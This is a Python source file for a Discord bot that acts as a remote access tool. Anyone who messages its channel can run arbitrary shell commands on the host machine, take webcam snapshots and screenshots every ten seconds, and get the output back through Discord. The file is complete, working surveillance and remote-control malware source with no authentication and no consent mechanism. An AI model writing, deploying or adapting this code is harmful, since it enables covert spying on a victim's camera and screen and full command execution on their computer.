import os
import discord
import subprocess
import shlex
import cv2
import io
import pyautogui
from discord.ext import tasks

BotToken = "your discord bot"

helpcmd = """commands
camera on: start the camera 
camera off: turn off the camera
$: send command to cmd 
screen on: start the screenshot
screen off: turn off the screenshot
\help: show all instructions
"""

class MyClient(discord.Client):
    def __init__(self, intents):
        super().__init__(intents=intents)
        self.screen_on = False
        self.capture = None

    async def on_ready(self):
        print(f'Logged in as {self.user}!')

    async def on_message(self, message):
        if message.author == self.user:
            return
        
        if message.content.startswith('\help'):
            await message.channel.send(f'```\n{helpcmd}\n```')

        elif message.content.startswith('$'):
            command = message.content[1:].strip()
            await self.process_command(command, message)

    async def process_command(self, command, message):
        if command == "camera on":
            self.capture = cv2.VideoCapture(0)
            if not self.capture.isOpened():
                await message.channel.send("Failed to open the camera.")
                self.capture = None
            else:
                await message.channel.send("Camera is now ON.")
                self.send_camera_feed.start(message.channel)

        elif command == "camera off":
            if self.capture:
                self.capture.release()
                self.capture = None
            await message.channel.send("Camera is now OFF.")
            self.send_camera_feed.cancel()

        elif command == "screen on":
            self.screen_on = True
            await message.channel.send("Screen capture is now ON.")
            self.take_screenshot.start(message.channel)

        elif command == "screen off":
            self.screen_on = False
            await message.channel.send("Screen capture is now OFF.")
            self.take_screenshot.cancel()

        else:
            await self.handle_other_commands(command, message)

    async def handle_other_commands(self, command, message):
        try:
            if command.startswith("cd "):
                target_dir = command[3:].strip()
                os.chdir(target_dir)
                await message.channel.send(f"Changed directory to {target_dir}")
                return

            command_parts = shlex.split(command)
            result = subprocess.run(command_parts, capture_output=True, text=True, shell=True)
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "No output."
            output = output[:1900]
            await message.channel.send(f'```\n{output}\n```')

        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")

    @tasks.loop(seconds=10)
    async def send_camera_feed(self, channel):
        if self.capture and self.capture.isOpened():
            ret, frame = self.capture.read()
            if ret:
                _, img_encoded = cv2.imencode('.png', frame)
                img_bytes = img_encoded.tobytes()
                image = io.BytesIO(img_bytes)
                await channel.send(file=discord.File(image, filename='camera_feed.png'))

    @tasks.loop(seconds=10)
    async def take_screenshot(self, channel):
        if self.screen_on:
            screenshot = pyautogui.screenshot()
            screenshot_io = io.BytesIO()
            screenshot.save(screenshot_io, format='PNG')
            screenshot_io.seek(0)
            await channel.send(file=discord.File(screenshot_io, filename='screenshot.png'))

    async def on_disconnect(self):
        if self.capture:
            self.capture.release()

intents = discord.Intents.default()
intents.message_content = True

client = MyClient(intents=intents)
client.run(BotToken)
